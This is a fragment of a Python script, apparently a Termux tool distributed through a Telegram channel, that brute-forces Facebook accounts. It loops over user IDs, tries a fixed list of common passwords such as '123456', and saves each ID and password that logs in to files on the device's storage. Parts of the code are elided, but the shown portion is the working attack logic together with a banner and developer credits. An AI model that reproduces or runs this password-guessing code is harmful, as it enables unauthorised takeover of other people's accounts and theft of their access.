#Sc gift by https://t.me/KGF_TERMUX_TEAM
#Tool Type : Old Crack 
#----------------------------[IMPORT/MODULE]-----------------------------------#
...
|_____|_| .__/ \__,_| |_|\_\_|_| |_|\__, |
        |_|                         |___/ 
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m DEVELOPER   :  LIPU KING
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m BROTHERS    :  LIPU-ROY
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m SCRIPT GIFT      : https://t.me/KGF_TERMUX_TEAM
...
def login(uid):
    ...
    try:
        sys.stdout.write(f'\r\x1b[38;5;196m[\x1b[38;5;48mAxF-OLD\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\033[1;37m{loop}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK•{len(oks)}\x1b[38;5;196m]')
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","143143"]:
            ...
            if "session_key" in rp:
                print(f"\r\r\033[1;30m[\033[1;33mLipu-lipu-OK\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
                open("/sdcard/OLD-LIPU-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r\033[1;30m[\033[1;33m-LIPU-OK\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
                open("/sdcard/OLD-LIPU-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
